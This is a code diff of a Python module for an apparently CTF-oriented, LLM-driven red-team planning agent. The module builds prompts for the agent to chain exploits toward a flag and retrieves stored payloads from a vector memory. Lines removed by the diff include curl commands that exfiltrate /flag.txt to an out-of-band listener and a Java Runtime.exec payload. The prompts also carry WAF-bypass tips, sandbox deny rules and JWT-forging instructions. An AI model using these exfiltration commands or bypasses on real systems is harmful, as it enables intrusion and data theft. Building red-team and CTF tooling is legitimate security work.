@@ -27,215 +27,160 @@ def _get_os_context() -> str:
 """
 
 
-_COMMON_RULES = """【执行环境与命令规范】：
-每个 Step 选择 `type="python"` 或 `type="shell"`：
-1. HTTP 请求/多步逻辑/数据解析 → type="python"，用 SDK（强烈推荐）
-2. 自动化 SQL 注入 → type="shell"，用 sqlmap
-3. 响应过滤 → type="shell"，管道: `curl ... | jq '.key'`
+def _extract_target_tags(confirmed: dict[str, Any]) -> list[str]:
+    """从 confirmed_vuln.json 提取当前靶机的技术栈标签用于 ChromaDB 元数据过滤。
 
-【🔴 代码格式铁律 — 最高优先级，违反即报错】：
-绝对禁止将 Python 代码压缩为单行！绝对禁止滥用分号（;）连接多条语句！
-你必须生成标准、规范的多行 Python 代码，严格保持正确的缩进和换行符。
+    标签来源（按优先级）：
+    1. CWE ID 列表
+    2. evidence / description 中的关键字词（库名、框架、协议、CVE 编号）
+    3. 静态关键词表（基于常见漏洞类型 + 框架名精确匹配）
+    4. title / vulnerability 字段
 
-✅ 正确写法：
-try:
-    f = open('session.json')
-    s.cookies.update(json.load(f))
-except Exception:
-    pass
+    返回值经过去重、小写、去噪，最多返回 15 个标签。
+    """
+    vulns = confirmed.get("vulnerabilities", [])
+    target_ctx = confirmed.get("target_context", {})
+    tags: list[str] = []
 
-❌ 错误写法（会导致 SyntaxError，绝对禁止）：
-try: f=open('session.json'); s.cookies.update(json.load(f)); except: pass
+    # ── 1. CWE IDs ──
+    for v in vulns:
+        for key in ("cwe_id", "cwe"):
+            cwe = v.get(key, "")
+            if isinstance(cwe, str) and cwe.strip() and cwe.strip().upper() != "UNKNOWN":
+                tags.append(cwe.strip().lower())
 
-同理，if/for/with/def/class 等所有含代码块的语句，必须换行缩进，禁止写在同一行。
+    # ── 2. 拼接所有文本字段做关键词提取 ──
+    text_blob_parts: list[str] = []
+    for v in vulns:
+        for key in ("title", "description", "evidence", "attack_chain", "data_flow",
+                     "source", "sink", "location"):
+            val = v.get(key, "")
+            if isinstance(val, str):
+                text_blob_parts.append(val)
+            elif isinstance(val, dict):
+                text_blob_parts.append(val.get("code_snippet", ""))
+    text_blob = " ".join(text_blob_parts)
 
-【Python 执行环境 — 多行脚本模式】：
-- type="python" 的 command 字段写**完整的多行 Python 脚本**
-- 脚本写入 step_{id}.py，在 Docker 沙箱中正常执行
-- **自由使用所有 Python 语法**：def、for、if、class、import、try/except、多行缩进
-- 已预装 redteam_sdk.py 到 /workspace/，直接 import 即可
+    # CVE 编号（CVE-YYYY-NNNNN）
+    for match in re.finditer(r'CVE-\d{4}-\d{4,}', text_blob, re.IGNORECASE):
+        tags.append(match.group(0).lower())
 
-【🔴 Python SDK 使用指南（redteam_sdk）】：
-你现在运行在一个支持多行 Python 脚本的沙箱中，并且内置了 redteam_sdk。
+    # 提取关键词：框架 / 库 / 协议 / 技术栈名称
+    # 知名安全相关技术栈关键词
+    known_keywords = [
+        # Web frameworks
+        "flask", "django", "fastapi", "express", "spring", "laravel", "rails",
+        "asp.net", "aspnet", "node.js", "nodejs", "react", "vue", "angular",
+        # Auth / JWT
+        "jwt", "oauth", "oauth2", "saml", "openid", "jose", "jwk", "jws", "jwe",
+        "python_jwt", "pyjwt", "authlib", "jwcrypto",
+        # Proxy / LB
+        "haproxy", "nginx", "apache", "traefik", "envoy", "caddy", "iis",
+        # Protocols
+        "http", "https", "websocket", "grpc", "graphql", "rest", "soap",
+        # Serialization
+        "pickle", "json", "yaml", "xml", "protobuf", "avro",
+        # Databases
+        "mysql", "postgresql", "postgres", "sqlite", "mongodb", "redis",
+        "mssql", "oracle", "mariadb",
+        # Languages
+        "python", "java", "php", "ruby", "go", "golang", "javascript", "typescript",
+        "c#", "csharp", "perl", "lua",
+        # Template engines
+        "jinja2", "jinja", "twig", "freemarker", "velocity", "thymeleaf", "mustache",
+        "handlebars", "ejs", "pug", "nunjucks", "smarty",
+        # Attack types (from CWE)
+        "ssti", "sqli", "sql", "xss", "csrf", "ssrf", "rce", "lfi", "rfi",
+        "path_traversal", "command_injection", "deserialization", "xxe",
+        "idor", "auth_bypass", "algorithm_confusion",
+        # Misc security terms
+        "rsa", "rs256", "hs256", "ps256", "es256", "ed25519", "ecdsa",
+        "sha256", "md5", "aes", "hmac",
+        # Tool-specific
+        "nuclei", "sqlmap", "burp", "metasploit",
+        # Docker / infra
+        "docker", "kubernetes", "k8s", "aws", "gcp", "azure",
+    ]
+    text_lower = text_blob.lower()
+    for kw in known_keywords:
+        if kw in text_lower:
+            tags.append(kw)
 
-标准导入：
-```python
+    # ── 3. 从 target_context 提取 ──
+    app_name = target_ctx.get("app_name", "")
+    if isinstance(app_name, str) and app_name.strip():
+        for word in app_name.lower().replace("_", " ").replace("-", " ").split():
+            w = word.strip()
+            if w and len(w) >= 2:
+                tags.append(w)
+
+    base_url = target_ctx.get("base_url", "")
+    if isinstance(base_url, str):
+        if "https" in base_url:
+            tags.append("https")
+
+    # ── 4. Evidence 中特定代码模式 ──
+    evidence_specific: list[str] = []
+    for v in vulns:
+        evidence = v.get("evidence", "")
+        if isinstance(evidence, dict):
+            evidence = evidence.get("code_snippet", "")
+        if isinstance(evidence, str):
+            evidence_specific.append(evidence)
+    evidence_text = " ".join(evidence_specific)
+    # 从代码片段中提取 import / require / use 语句中的库名
+    for match in re.finditer(r'(?:import|from|require|use)\s+(\w+)', evidence_text):
+        lib = match.group(1).lower()
+        if lib not in ("os", "sys", "re", "json", "time", "io", "typing"):
+            tags.append(lib)
+
+    # ── 5. 去重 + 去噪 ──
+    noise = {"", "unknown", "none", "a", "in", "of", "to", "is", "it", "be", "as", "at",
+             "by", "an", "or", "on", "no", "so", "do", "if", "we", "he", "me", "my", "up",
+             "the", "and", "for", "with", "that", "this", "from", "when", "file", "line",
+             "rce", "lfi"}
+    seen: set[str] = set()
+    deduped: list[str] = []
+    for t in tags:
+        t = t.strip().lower()
+        if t and t not in seen and t not in noise:
+            seen.add(t)
+            deduped.append(t)
+
+    # Cap at 15 to keep the $or clause reasonable
+    return deduped[:15]
+
+
+_COMMON_RULES = """════════════════════ 沙箱执行约束 ════════════════════
+1. 严禁 import os / subprocess / sys / ctypes / socket — 全部触发安全阻断
+2. /workspace 只读！数据传递用 save_context/load_context 或写 /tmp/
+3. HTTP 交互用 HttpClient (requests.Session 封装)，反连监听用 OOBReceiver
+4. Python 代码必须多行缩进，严禁单行分号串联 (SyntaxError)
+5. 禁止 pipe 到 sh/bash，禁止编造 URL 路径，禁止手写正则解析 HTML/JSON/JWT
+
+═══════════════ SDK 速查表 (redteam_sdk) ═══════════════
 from redteam_sdk import HttpClient, ContextStore, OOBReceiver, save_context, load_context, output_result
-```
-（`AttackerSession` 是 `HttpClient` 的别名，两者等价）
 
-**HttpClient** — 封装 requests.Session，自动处理 SSL 和 Session：
-```python
-# base_url 必须从 CO_REDTEAM_CONTEXT 的 target_context.base_url 动态读取
-# 绝对禁止硬编码域名如 host.docker.internal / localhost！
-import os, json, urllib3; urllib3.disable_warnings()
+# base_url 从 context.json 动态读取，禁止硬编码域名
+import json, urllib3; urllib3.disable_warnings()
 with open('/workspace/context.json') as f: ctx = json.load(f)
-target_base = ctx.get('target_context', {}).get('base_url', os.environ.get('TARGET_URL', ''))
-s = HttpClient(target_base)
-r = s.post("/api/register", data={"email":"...", "password":"...", "username":"..."})
-r2 = s.post("/api/login", data={"email":"...", "password":"..."})
-```
-- **自动恢复 Session**：创建时自动从 session.json 读取上一步的 Cookies
-- **自动保存 Session**：脚本结束时自动将 Cookies 写回 session.json（下一步自动恢复）
-- **不需要手动管理 Cookie！**
+target_base = ctx.get('target_context', {}).get('base_url', '')
+s = HttpClient(target_base)          # 自动恢复/保存 Session Cookie
 
-**auto_extract_csrf()** — 智能提取 antiCSRFToken：
-```python
-csrf_token = s.auto_extract_csrf()
-```
-- 优先从 JWT session cookie 的 payload 中解码提取
-- 兜底从 HTML 响应体中正则匹配 hidden input
+s.get(path) / s.post(path, data=...) / s.put(path, json=...) / s.delete(path)
+s.raw_request('GET', '/path#frag')    # WAF绕过：保留 # %00 ..;/ 等字符（返回 RawResponse(有 .status_code .text .headers .json())）
+s.auto_extract_csrf()                 # 从 JWT cookie 或 HTML 自动提取 antiCSRFToken
 
-**ContextStore** — 跨步骤 KV 存储（推荐替代 save_context/load_context）：
-```python
-ctx = ContextStore()
-ctx.save("token", "abc123")
-token = ctx.load("token")
-```
+ctx = ContextStore(); ctx.save('k', v); ctx.load('k')   # 跨步骤 KV 存储
+save_context('k', v); load_context('k'); output_result(dict)  # 快捷方式
 
-**OOBReceiver** — 用于 SSRF/XSS/SSTI 等需要反连的漏洞，**禁止自己写 socket 监听**：
-```python
-oob = OOBReceiver(port=8765)
-oob.start()
-# ... 触发漏洞，让目标回连 oob.url ...
-hit = oob.wait_for_callback(timeout=30)
-if hit:
-    output_result({"oob_path": hit["path"], "oob_body": hit["body"]})
+oob = OOBReceiver(port=8765); oob.start()  # Blind RCE 带外反连
+hit = oob.wait_for_callback(timeout=30)    # 等待目标回连
 oob.stop()
-```
 
-**save_context / load_context** — 模块级快捷方式：
-```python
-save_context("key_name", value)
-value = load_context("key_name", default=None)
-```
-
-**output_result()** — 输出链式结果：
-```python
-output_result({"status": r.status_code, "token": csrf_token})
-```
-
-【🔴 数据解析铁律 — 禁止脆弱的正则，必须用专业库】：
-- **HTML 解析** → 必须用 `bs4.BeautifulSoup`，禁止用 `re.search` 提取 HTML 结构
-  ```python
-  from bs4 import BeautifulSoup
-  soup = BeautifulSoup(r.text, "html.parser")
-  token = soup.find("input", {"name": "csrf_token"})["value"]
-  ```
-- **JWT/Token 解析** → 必须用 `jwt.decode` 或 `base64` 解码，禁止手写 split+正则
-  ```python
-  import jwt
-  payload = jwt.decode(token, options={"verify_signature": False})
-  ```
-- **JSON API 响应** → 直接用 `r.json()`，禁止用正则从 JSON 字符串提取字段
-  ```python
-  data = r.json()
-  flag = data.get("flag") or data.get("data", {}).get("flag")
-  ```
-- **需要反连（SSRF/XSS/SSTI）** → 直接调用 `OOBReceiver`，禁止自己写 socket/http.server
-
-【协议要求】：
-- 从 target_context.base_url 判断 HTTP/HTTPS，禁止混用
-- HTTPS 时 HttpClient 默认已关闭 SSL 校验
-
-【REST API 调试铁律 — 遇到错误码必须先按此排查！】：
-1. "All fields are required!" → 检查：a) 用 `data=` (form-encoded) b) 字段名从证据代码提取 c) 是否遗漏必填字段
-2. "Invalid Email Address" → 邮箱有格式校验，换到其他字段注入
-3. 401 → 先确认登录成功(200)，HttpClient 自动传 Cookie
-4. "CSRF Detected!" → 用 s.auto_extract_csrf() 从 JWT 解码获取
-5. 405 → HTTP 方法错误，POST/GET 互换
-6. 通用原则：**排查顺序 = 请求格式 > 字段名 > Content-Type > Payload**
-
-【CLI 命令格式（type="shell" 时）】：
-- 多条命令用 `&&` 或 `;` 串联
-- 管道合法：`curl url | jq '.token'` ✅ / `curl url | sh` ❌
-- sqlmap：`sqlmap -u "URL" --batch --level=2 [--force-ssl]`
-
-【JSON 格式要求】：
-- 输出单个合法 JSON 对象，严禁 Markdown 标记
-- 顶层字段：version(1), plan_id(str), vuln_summary(str), rationale(str), steps(数组), chain_design(str)
-- 每个 step 必须包含以下字段：
-  - id: 整数，从 1 开始递增
-  - status: 字符串，初始必须为 "PLANNED"（可选值：PLANNED/IN_PROGRESS/DONE/BLOCKED）
-  - type: "python" 或 "shell"
-  - command: 字符串，完整脚本或命令
-  - purpose: 字符串，说明该步骤的目标和预期输出
-  - depends_on: 字符串或 null，依赖的前置步骤 id
-  - on_failure: 字符串，步骤失败时的处理方案（"BLOCK_AND_DEBUG" 或 "SKIP"）
-
-【Exploit Plan 状态机（必须严格维护）】：
-状态转换规则：
-  PLANNED → IN_PROGRESS（当前轮次正在执行）
-  IN_PROGRESS → DONE（exit_code=0 且有期望输出）
-  IN_PROGRESS → BLOCKED（exit_code≠0 或输出异常）
-  BLOCKED → 追加排错步骤（id 递增，purpose 注明"排错：修复 step X 失败"）
-
-规划原则：
-- 初始生成时所有步骤状态均为 "PLANNED"
-- 每轮规划必须保留已 DONE 的步骤（不删除历史），仅追加新步骤或修改 BLOCKED 步骤
-- BLOCKED 步骤必须追加专门的排错步骤，command 中加入 print 调试信息缩小问题范围
-- 收到执行反馈后，按状态机规则更新每个步骤的 status
-
-【攻击链设计原则】：
-1. 必须设计多步串联攻击链，复杂目标需要5-10个步骤
-2. 第一步从 reconnaissance 开始（注册/登录/探测），建立初始会话
-3. 中间步骤按漏洞依赖排列：权限提升→数据窃取→RCE
-4. 每步通过 ContextStore/save_context/output_result 传递数据，HttpClient 自动传递 Cookies
-5. 最后一步必须尝试获取 flag
-
-【🔴 无回显应对法则（最高优先级，凌驾于所有其他攻击链原则）】：
-当你收到 Evaluator 反馈中包含"无回显"、"stdout 为空"、"Blind RCE"等信号时，
-说明目标存在 Blind RCE：命令已在服务端执行，但输出被吞掉，无法通过 HTTP 响应回显。
-
-此时【严禁】执行以下无效操作：
-  - 仅仅修改系统命令（如把 `cat /flag.txt` 换成 `ls /`、`id`、`whoami`）
-  - 增加 `--verbose` 或换用其他无回显命令
-  - 重复尝试相同的数据传输通道
-
-你【必须】立即切换数据外传通道，按以下优先级选择：
-
-  ① 首选 — OOB 带外提取（redteam_sdk.OOBReceiver）：
-    ```python
-    from redteam_sdk import OOBReceiver, HttpClient
-    import os, json
-    with open('/workspace/context.json') as f: ctx = json.load(f)
-    target_base = ctx['target_context']['base_url']
-    oob = OOBReceiver(port=8765)
-    oob.start()
-    # 将 RCE payload 改为：curl -d @/flag.txt {oob.url}
-    # 或：curl {oob.url}?q=$(cat /flag.txt | base64)
-    s = HttpClient(target_base)
-    s.post("/vulnerable/endpoint", data={"cmd": f"curl -s -d @/flag.txt {oob.url}"})
-    hit = oob.wait_for_callback(timeout=30)
-    if hit:
-        print("OOB received:", hit["path"], hit["body"])
-    oob.stop()
-    ```
-
-  ② 次选 — Java/Python 语言级流读取（适用于 Java Runtime.exec() 场景）：
-    ```python
-    # 将 RCE payload 改为读取 InputStream 的代码字符串，例如：
-    java_payload = (
-        "new java.util.Scanner("
-        "Runtime.getRuntime().exec(new String[]{{'/bin/sh','-c','cat /flag.txt'}})"
-        ".getInputStream()).useDelimiter('\\\\A').next()"
-    )
-    ```
-
-  ③ 兜底 — stderr 合并（仅当上两项均不可用时）：
-    在每条 shell 命令末尾追加 ` 2>&1`，将 stderr 合并到 stdout 输出。
-
-【Session管理（SDK 自动处理！）】：
-- 注册/登录后 HttpClient 自动持有 session cookie
-- 下一步创建新 HttpClient 时自动从 session.json 恢复
-- **不需要手动读取/传递 Cookie！**
-
-【禁止】：
-- 禁止 pipe 到 sh/bash
-- 禁止编造 URL 路径 — 只能从端点列表选用
-- 禁止读取 /etc/passwd 或 /etc/shadow（除非验证SSRF等必要操作）
-- 禁止用正则提取 HTML/JSON/JWT 结构数据 — 必须用 bs4/jwt/r.json()
-- 禁止自己写 socket/http.server 监听 — 必须用 OOBReceiver
+# 数据解析：HTML→BeautifulSoup, JSON→r.json(), JWT→base64+json, 禁止手写正则
+# REST 调试：Form=用data=, JSON=用json=; 401→先确认登录成功; 405→换Method
+# Shell 步骤: curl|jq ✅  curl|sh ❌; sqlmap -u "URL" --batch --level=2
 """
 
 
@@ -681,92 +626,260 @@ def build_dynamic_prompt(confirmed: dict[str, Any], adapter: ChallengeAdapter | 
     if adapter is not None:
         challenge_rules = adapter.extra_rules()
 
-    prompt = f"""你是 Co-RedTeam 规划智能体。你的核心任务不是简单列出漏洞验证步骤，而是**设计一条能够真正拿到 flag 的完整攻击链**。
+    # ── 核心攻击逻辑（前置，让 LLM 第一眼看到最关键的信息）──────
+    core_logic = f"""你是 Co-RedTeam 规划智能体。设计能拿到 flag 的完整攻击链。
 
-【网络定位指令】：
-目标系统运行在宿主机上！你生成的所有攻击请求 URL，必须以 `{target_base}` 作为基础地址（绝对禁止使用 localhost、127.0.0.1 或 target 作为域名）！
-{protocol_hint}
+目标: {target_base} ({target_name}) — {protocol_hint}
+蓝图层: {bp_info if bp_info else '无'}
+端点: {endpoints_str}
 
-{os_context}
-
-【目标系统概要】：
-  应用名称: {target_name}
-  目标基础URL: {target_base}
-{bp_info}
-【从 Stage 1 代码审计识别的 API 端点】（只能从这里选择，禁止编造URL路径）：
-{endpoints_str}
-
-【待攻击漏洞列表】（来自 Stage 1 分析结果）：
-{vuln_table}
-
-{cwe_templates}
-
-【漏洞详细证据】（包含代码片段和攻击链，请根据真实代码生成精准攻击脚本）：
+═══════════════ ★ 漏洞核心证据与攻击链（← 从这里开始！） ═══════════════
+你必须基于以下 Stage 1 审计结果制定计划。如果漏洞有 CVE 编号，严格按对应 PoC 逻辑编写 exploit 代码。
 {evidence_extracts}
 
-【攻击链设计任务】：
-在输出计划之前，你必须完成以下分析（将结果写入 chain_design 字段）：
-1. 逐一阅读每个漏洞的 attack_chain 和 data_flow，理解该漏洞的触发条件
-2. 判断漏洞之间是否存在"前置条件"依赖：B 漏洞的利用是否必须先拥有 A 漏洞获得的权限/数据？
-3. 设计一条从"初始入口"到"拿到 flag"的完整路径
-4. 第一步从注册/登录/探测开始（用最简单的用户名密码），建立会话
-5. 中间步骤按逻辑依赖排列：前一步的输出（session cookie / token / 权限）通过 ContextStore/output_result 传给后一步
-6. 最后一步必须尝试通过 RCE / 文件读取 / 命令执行 获取 flag
-7. 如果无法设计出完整的 RCE 链，则设计能验证最多漏洞的串联路径
-8. 遇到需要反连的漏洞（SSRF/XSS/SSTI），直接在步骤中使用 OOBReceiver，不要自己写 socket
+══════════════ 漏洞概览 ═══════════════
+{vuln_table}"""
+
+# ── CWE 模板 + 规则放后面，作为参考而非主读材料 ──
+    if cwe_templates:
+        core_logic += f"\n\n【CWE 专项模板参考】\n{cwe_templates}"
+
+    core_logic += f"""
+
+【攻击链设计要求】
+1. 根据漏洞依赖关系设计从入口到 flag 的完整路径
+2. 第一步必须以探测/验证开头，最后一步必须尝试获取 flag
+3. 步骤间数据通过 ContextStore/save_context/output_result 传递
+4. 遇到 HAProxy/WAF 路径规则绕过，使用 raw_request() 原样发送 #/%00/..;/ 字符
+5. Blind RCE 时立即切换 OOBReceiver 带外反连
+
+【JSON 格式要求】
+顶层字段: version(1), plan_id(str), vuln_summary(str), rationale(str), chain_design(str), steps(list), history_state(对象)
+每个 step: id(int), status("PLANNED"), type("python"|"shell"), command(str: 完整多行脚本), purpose(str), expected_outcome(str), depends_on(str|null), on_failure("BLOCK_AND_DEBUG"|"SKIP")
+history_state: {{"tried_payloads":[...], "failed_reasons":[...], "consecutive_failures_per_category":{{}}, "forced_path_switch":"...""}}
+
+【防死循环】
+- 禁止重复 tried_payloads 中的 payload
+- 同类漏洞连败 ≥3 次强制切换攻击路径
+- rationale 开头说明本轮与前轮的关键区别
+
+	【🔴 VERBATIM COPY — 精确复制规则（最高优先级，违反则攻击必然失败）】
+	当 CWE 模板或长期记忆中出现以下任一标记时，你必须逐字符原样复制代码，严禁做任何改写：
+	  标记 1: "EXACT FORGE FUNCTION (verbatim copy — DO NOT MODIFY)"
+	  标记 2: "CRITICAL RULES (violation = exploit fails)"
+	  标记 3: "【绝对禁止】"
+
+	严禁的改写行为（这些行为已导致多次任务失败）：
+	  ❌ 禁止用 json.dumps(dict) 替代字符串拼接（JSON key 顺序对漏洞利用至关重要）
+	  ❌ 禁止在 base64 编码后调用 .rstrip('=')（python_jwt 内部解码器需要完整 padding）
+	  ❌ 禁止改变 polyglot 构造中的 key 顺序（必须把伪造 key 放在 JSON 对象的第一个位置）
+	  ❌ 禁止用 requests.get() 替代 raw_request() 处理含 # 的路径（requests 库会丢弃 # 后的内容）
+	  ❌ 禁止用 f-string 中的 {{header}}.{{payload}}.{{signature}} 替代模板中的固定拼接方式
+
+	正确做法：见到 "verbatim copy" 标记 → 直接复制模板中的完整函数体 → 在 step.command 中调用它
+
+【Step 状态机】
+PLANNED→IN_PROGRESS→DONE(exit_code=0)|BLOCKED(exit_code≠0)→追加排错步骤
 
 {_COMMON_RULES}
 {challenge_rules}
 """
 
+    prompt = core_logic
+
     return prompt
 
 
-def _build_memory_context(memory: LayeredMemory, vuln_summary: str) -> str:
-    context_parts = []
+def _build_memory_context(
+    memory: LayeredMemory,
+    confirmed: dict[str, Any],
+    feedback: dict[str, Any] | None = None,
+) -> str:
+    """RAG 检索 + 元数据过滤：从 L1(模式) / L2(策略) / L3(技术) 提取相关经验。
 
-    pattern_results = memory.query_patterns(
-        query_text=f"{vuln_summary} 漏洞利用 攻击策略 payload",
-        n_results=5,
+    核心改进（v2）：
+    1. 先从 confirmed_vuln.json 提取 target_tags（JWT / haproxy / python 等）
+    2. 三层检索全部加 where 过滤，只召回 tags_str 匹配的条目
+    3. 过滤无结果时自动降级为无过滤检索（由 memory_store 内部实现）
+    4. 彻底解决"打 LockTalk 搜出致远 OA 脚本"的问题
+    """
+    vulns = confirmed.get("vulnerabilities", [])
+    cwe_ids: list[str] = [
+        v.get("cwe_id", "") for v in vulns if v.get("cwe_id")
+    ]
+    vuln_titles = " ".join(v.get("title", "") for v in vulns)[:300]
+    vuln_desc = " ".join(
+        f"{v.get('source', '')} {v.get('sink', '')} {v.get('description', '')}"
+        for v in vulns
+    )[:500]
+
+    # ── 提取技术栈标签用于 ChromaDB 元数据过滤 ──
+    target_tags = _extract_target_tags(confirmed)
+
+    # ── 从 feedback 提取错误指纹用于精准避坑检索 ──
+    error_hints = ""
+    if feedback:
+        errors = feedback.get("errors", []) if isinstance(feedback.get("errors"), list) else []
+        stderr_snippets = " ".join(str(e) for e in errors)[:200]
+        fb_text = feedback.get("feedback_for_planner", "")[:300]
+        fb_summary = feedback.get("summary", "")[:200]
+        error_hints = f"{stderr_snippets} {fb_text} {fb_summary}"
+
+    context_parts: list[str] = []
+
+    # ═══════════════════════════════════════════════════════════════
+    # L1 — 漏洞模式（pattern_collection）[元数据过滤]
+    # ═══════════════════════════════════════════════════════════════
+    pattern_query = f"{' '.join(cwe_ids)} {vuln_titles} 漏洞模式 检测路径"
+    pattern_results = memory.query_patterns_filtered(
+        pattern_query, filter_tags=target_tags, n_results=3,
     )
     if pattern_results:
-        context_parts.append("【历史漏洞模式经验 (来自长期记忆)】：")
+        context_parts.append("  【L1·漏洞模式】")
         for i, item in enumerate(pattern_results):
-            context_parts.append(f"  模式{i+1}: {item['content']}")
+            context_parts.append(f"    ▸ {item['content'][:300]}")
 
-    strategy_results = memory.query_strategies(
-        query_text=f"{vuln_summary} 成功利用方法 攻击步骤",
-        n_results=5,
-    )
-    if strategy_results:
-        context_parts.append("\n【历史利用策略 (来自长期记忆)】：")
-        for i, item in enumerate(strategy_results):
-            stype = item.get("metadata", {}).get("strategy_type", "unknown")
-            label = "✅ 成功" if stype != "failure" else "❌ 失败教训"
-            context_parts.append(f"  策略{i+1} [{label}]: {item['content']}")
+    # ═══════════════════════════════════════════════════════════════
+    # L2 — 利用策略（strategy_collection），成功 + 失败分列 [元数据过滤]
+    # ═══════════════════════════════════════════════════════════════
+    success_hits: list[str] = []
+    failure_hits: list[str] = []
 
-    tech_results = memory.query_tech(
-        query_text=f"{vuln_summary} 命令 脚本 payload",
-        n_results=5,
-    )
-    if tech_results:
-        context_parts.append("\n【历史技术操作 (来自长期记忆)】：")
-        for i, item in enumerate(tech_results):
-            ttype = item.get("metadata", {}).get("tech_type", "unknown")
-            context_parts.append(f"  技术{i+1} [{ttype}]: {item['content']}")
+    # CWE-keyed 成功策略
+    for cwe in cwe_ids[:3]:
+        results = memory.query_strategies_filtered(
+            query_text=f"{cwe} {vuln_titles[:100]} 利用 攻击 payload 绕过",
+            filter_tags=target_tags,
+            n_results=3,
+        )
+        for item in results:
+            stype = item.get("metadata", {}).get("strategy_type", "")
+            if stype != "failure":
+                content = item["content"][:250]
+                if content not in success_hits:
+                    success_hits.append(content)
 
-    failure_results = memory.query_strategies(
-        query_text=f"{vuln_summary} 失败 错误 教训 InvalidURL ConnectionError SSLError SyntaxError",
-        n_results=5,
-    )
-    if failure_results:
-        failure_items = [f for f in failure_results if f.get("metadata", {}).get("strategy_type") == "failure"]
-        if failure_items:
-            context_parts.append("\n【⚠️ 历史失败教训 (请避免重复这些错误)】：")
-            for i, item in enumerate(failure_items):
-                context_parts.append(f"  教训{i+1}: {item['content']}")
+    # 通用成功策略兜底
+    if len(success_hits) < 3:
+        results = memory.query_strategies_filtered(
+            query_text=f"{vuln_desc[:200]} 漏洞利用 成功 攻击步骤",
+            filter_tags=target_tags,
+            n_results=5,
+        )
+        for item in results:
+            stype = item.get("metadata", {}).get("strategy_type", "")
+            if stype != "failure":
+                content = item["content"][:250]
+                if content not in success_hits:
+                    success_hits.append(content)
 
-    return "\n".join(context_parts)
+    # 失败教训：CWE-keyed + error-keyed
+    for cwe in cwe_ids[:3]:
+        results = memory.query_strategies_filtered(
+            query_text=f"{cwe} 失败 错误 教训 避坑 不要",
+            filter_tags=target_tags,
+            n_results=3,
+        )
+        for item in results:
+            if item.get("metadata", {}).get("strategy_type") == "failure":
+                content = item["content"][:250]
+                if content not in failure_hits:
+                    failure_hits.append(content)
+
+    if error_hints.strip():
+        results = memory.query_strategies_filtered(
+            query_text=f"{error_hints[:300]} 失败 错误 修复",
+            filter_tags=target_tags,
+            n_results=3,
+        )
+        for item in results:
+            if item.get("metadata", {}).get("strategy_type") == "failure":
+                content = item["content"][:250]
+                if content not in failure_hits:
+                    failure_hits.append(content)
+
+    if success_hits:
+        context_parts.append("  【L2·成功策略】")
+        for i, s in enumerate(success_hits[:5]):
+            context_parts.append(f"    ✅ {s}")
+    if failure_hits:
+        context_parts.append("  【L2·失败教训（禁止重复！）】")
+        for i, fh in enumerate(failure_hits[:5]):
+            context_parts.append(f"    ❌ {fh}")
+
+    # ═══════════════════════════════════════════════════════════════
+    # L3 — 技术操作（tech_collection）★ 最关键的一层 ★ [元数据过滤]
+    # ═══════════════════════════════════════════════════════════════
+    tech_items: list[dict[str, Any]] = []
+    for cwe in cwe_ids[:3]:
+        results = memory.query_tech_payloads_filtered(
+            query_text=f"{cwe} payload 攻击 利用 命令 脚本",
+            filter_tags=target_tags,
+            n_results=8,
+        )
+        for item in results:
+            if item["content"] not in [t["content"] for t in tech_items]:
+                tech_items.append(item)
+
+    # 通用 payload 兜底
+    if len(tech_items) < 5:
+        results = memory.query_tech_payloads_filtered(
+            query_text=f"{vuln_desc[:300]} {vuln_titles[:150]} payload 注入 攻击",
+            filter_tags=target_tags,
+            n_results=8,
+        )
+        for item in results:
+            if item["content"] not in [t["content"] for t in tech_items]:
+                tech_items.append(item)
+
+    if tech_items:
+        context_parts.append("  【L3·特种 Payload / 脚本（可直接复用！）】")
+        payload_seen: set[str] = set()
+        for i, item in enumerate(tech_items[:8]):
+            payload = item.get("payload") or ""
+            cmd = item.get("command") or ""
+            script = item.get("script") or ""
+            meta = item.get("metadata", {})
+            name = meta.get("name", "") or meta.get("context", "") or ""
+            source = meta.get("source", "")
+            source_tag = f" [来源:{source}]" if source else ""
+
+            if payload and payload not in payload_seen:
+                payload_seen.add(payload)
+                context_parts.append(f"    📦 Payload({name}){source_tag}: {payload[:500]}")
+            elif cmd and cmd not in payload_seen:
+                payload_seen.add(cmd)
+                context_parts.append(f"    💻 命令{source_tag}: {cmd[:400]}")
+            elif script and script not in payload_seen:
+                payload_seen.add(script)
+                # Scripts can be long; keep more but still cap
+                context_parts.append(f"    📜 脚本({name}):\n{script[:800]}")
+            else:
+                # Fallback: just the content
+                context_parts.append(f"    ▸ {item['content'][:300]}")
+
+    if not context_parts:
+        return ""
+
+    # Assembled as a mandatory high-priority block
+    body = "\n".join(context_parts)
+    filter_note = ""
+    if target_tags:
+        filter_note = f"\n🔍 元数据过滤已启用 | target_tags: {', '.join(target_tags[:10])}"
+    return f"""╔══════════════════════════════════════════════════════════════╗
+║  🧠 长期记忆提取 — 强制参考（L1/L2/L3 ChromaDB 向量检索）  ║
+╚══════════════════════════════════════════════════════════════╝
+【⚠️ 你必须将以下经验整合进攻击计划中，不得无视！】{filter_note}
+
+{body}
+
+────────────────────────────────────────────────────────────
+【使用说明】：
+- L3 中的 Payload 和脚本已从历史经验库中向量匹配，与当前目标高度相关
+- 如果 L3 提供了完整的 Python/Shell payload，直接将其核心逻辑嵌入 type="python" 或 type="shell" 步骤
+- L2 中的失败教训是本系统积累的"避坑指南"，绝对禁止重蹈覆辙
+- 如果某个 Payload 和当前目标的端点/参数/攻击面不匹配，应改编而非完全抛弃
+────────────────────────────────────────────────────────────"""
 
 
 def _mock_plan(confirmed: dict[str, Any], memory: LayeredMemory) -> dict[str, Any]:
@@ -791,7 +904,7 @@ def _mock_plan(confirmed: dict[str, Any], memory: LayeredMemory) -> dict[str, An
     ]
 
     mem_stats = memory.get_stats()
-    mem_context = _build_memory_context(memory, title)
+    mem_context = _build_memory_context(memory, confirmed)
     steps.append(
         {
             "id": 3,
@@ -813,6 +926,63 @@ def _mock_plan(confirmed: dict[str, Any], memory: LayeredMemory) -> dict[str, An
     }
 
 
+def _build_forbidden_techniques_block(feedback: dict[str, Any]) -> str:
+    """从上一轮 feedback 的 strategy.add_failures 中提取"绝对禁止重用"的技术列表。
+
+    当特工上一轮用了 %2523 双重编码报 404，本轮必须在此明确反思并彻底回避。
+    返回一个高可见度的禁止块，直接拼入 system prompt。
+    """
+    memory_patch = feedback.get("memory_patch", {})
+    strategy_patch = memory_patch.get("strategy", {})
+    failures = strategy_patch.get("add_failures", [])
+    if not failures:
+        return ""
+
+    lines: list[str] = []
+    lines.append("╔══════════════════════════════════════════════════════════════╗")
+    lines.append("║  🔴 失败指纹黑名单 — 绝对禁止重用以下已证伪的技术！      ║")
+    lines.append("╚══════════════════════════════════════════════════════════════╝")
